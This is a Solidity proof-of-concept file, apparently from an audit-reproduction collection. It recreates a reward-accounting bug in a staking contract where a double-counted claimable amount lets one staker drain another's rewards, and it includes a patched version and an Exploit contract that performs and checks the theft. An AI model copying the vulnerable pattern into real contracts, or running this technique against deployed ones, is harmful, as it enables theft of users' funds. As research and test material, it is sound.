// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

/*
 * AuditVault 57532 — Magic Yearn MyStaking.stake (Zokyo, 2022-08).
 * claimableAmount() already adds userInfo.unclaimedAmount. stake() then adds
 * that claimable total back onto unclaimedAmount, so a second stake doubles
 * stored rewards and the caller drains the other staker's share.
 */

contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _move(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allow");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        _move(from, to, amount);
        return true;
    }

    function _move(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

contract MyStaking {
    struct UserInfo {
        uint256 amount;
        uint256 unclaimedAmount;
        uint256 rewardDebt;
    }

    MiniToken public immutable stakeToken;
    MiniToken public immutable reward;
    uint256 public accRewardPerShare;
    uint256 public totalStaked;
    mapping(address => UserInfo) public userInfo;
    mapping(address => uint256) public paid;

    constructor(MiniToken _stakeToken, MiniToken _reward) {
        stakeToken = _stakeToken;
        reward = _reward;
    }

    function claimableAmount(address user) public view returns (uint256) {
        UserInfo memory u = userInfo[user];
        uint256 accrued = u.amount * accRewardPerShare / 1e18 - u.rewardDebt;
        return accrued + u.unclaimedAmount;
    }

    function addReward(uint256 amount) external {
        reward.transferFrom(msg.sender, address(this), amount);
        accRewardPerShare += amount * 1e18 / totalStaked;
    }

    function stake(uint256 amount) external {
        UserInfo storage u = userInfo[msg.sender];
        uint256 claimable = claimableAmount(msg.sender);
        // @> VULN: claimable already includes unclaimedAmount, so this doubles it
        u.unclaimedAmount += claimable;
        if (amount > 0) {
            stakeToken.transferFrom(msg.sender, address(this), amount);
            u.amount += amount;
            totalStaked += amount;
        }
        u.rewardDebt = u.amount * accRewardPerShare / 1e18;
    }

    function claim() external {
        UserInfo storage u = userInfo[msg.sender];
        uint256 accrued = u.amount * accRewardPerShare / 1e18 - u.rewardDebt;
        uint256 amount = u.unclaimedAmount + accrued;
        u.unclaimedAmount = 0;
        u.rewardDebt = u.amount * accRewardPerShare / 1e18;
        uint256 bal = reward.balanceOf(address(this));
        uint256 pay = amount > bal ? bal : amount;
        if (pay > 0) reward.transfer(msg.sender, pay);
        paid[msg.sender] += pay;
    }
}

contract MyStakingFixed {
    struct UserInfo {
        uint256 amount;
        uint256 unclaimedAmount;
        uint256 rewardDebt;
    }

    MiniToken public immutable stakeToken;
    MiniToken public immutable reward;
    uint256 public accRewardPerShare;
    uint256 public totalStaked;
    mapping(address => UserInfo) public userInfo;
    mapping(address => uint256) public paid;

    constructor(MiniToken _stakeToken, MiniToken _reward) {
        stakeToken = _stakeToken;
        reward = _reward;
    }

    function _accrued(address user) internal view returns (uint256) {
        UserInfo memory u = userInfo[user];
        return u.amount * accRewardPerShare / 1e18 - u.rewardDebt;
    }

    function addReward(uint256 amount) external {
        reward.transferFrom(msg.sender, address(this), amount);
        accRewardPerShare += amount * 1e18 / totalStaked;
    }

    function stake(uint256 amount) external {
        UserInfo storage u = userInfo[msg.sender];
        uint256 accrued = _accrued(msg.sender);
        u.unclaimedAmount += accrued;
        if (amount > 0) {
            stakeToken.transferFrom(msg.sender, address(this), amount);
            u.amount += amount;
            totalStaked += amount;
        }
        u.rewardDebt = u.amount * accRewardPerShare / 1e18;
    }

    function claim() external {
        UserInfo storage u = userInfo[msg.sender];
        uint256 accrued = _accrued(msg.sender);
        uint256 amount = u.unclaimedAmount + accrued;
        u.unclaimedAmount = 0;
        u.rewardDebt = u.amount * accRewardPerShare / 1e18;
        if (amount > 0) reward.transfer(msg.sender, amount);
        paid[msg.sender] += amount;
    }
}

contract VictimStaker {
    function approveAndStake(MiniToken token, MyStaking staking, uint256 amount) external {
        token.approve(address(staking), type(uint256).max);
        staking.stake(amount);
    }

    function claim(MyStaking staking) external {
        staking.claim();
    }
}

contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    uint256 public constant STAKE_AMT = 100 ether;
    uint256 public constant REWARD_TOTAL = 2000 ether;

    MiniToken public stakeToken;
    MiniToken public reward;
    MyStaking public staking;
    VictimStaker public victim;
    uint256 public attackerPaid;
    uint256 public victimPaid;
    uint256 public stolen;

    constructor() {
        stakeToken = new MiniToken("Stake", "STK");
        reward = new MiniToken("Reward", "RWD");
        staking = new MyStaking(stakeToken, reward);
        victim = new VictimStaker();
    }

    function run() external {
        stakeToken.mint(address(this), STAKE_AMT);
        stakeToken.mint(address(victim), STAKE_AMT);
        stakeToken.approve(address(staking), type(uint256).max);
        staking.stake(STAKE_AMT);
        victim.approveAndStake(stakeToken, staking, STAKE_AMT);
        reward.mint(address(this), REWARD_TOTAL);
        reward.approve(address(staking), type(uint256).max);
        staking.addReward(REWARD_TOTAL);
        uint256 firstClaimable = staking.claimableAmount(address(this));
        staking.stake(0);
        uint256 storedOnce = _unclaimed();
        staking.stake(0);
        uint256 storedTwice = _unclaimed();
        staking.claim();
        victim.claim(staking);
        attackerPaid = staking.paid(address(this));
        victimPaid = staking.paid(address(victim));
        stolen = attackerPaid - (REWARD_TOTAL / 2);
        require(firstClaimable == 1000 ether, "fair accrual");
        require(storedOnce == 1000 ether, "first store");
        require(storedTwice == 2000 ether, "doubled");
        require(attackerPaid == 2000 ether, "attacker paid");
        require(victimPaid == 0, "victim paid");
        require(stolen == 1000 ether, "stolen");
        reward.transfer(SINK, stolen);
        require(reward.balanceOf(SINK) == 1000 ether, "sink");
    }

    function _unclaimed() internal view returns (uint256 amount) {
        (, amount,) = staking.userInfo(address(this));
    }
}
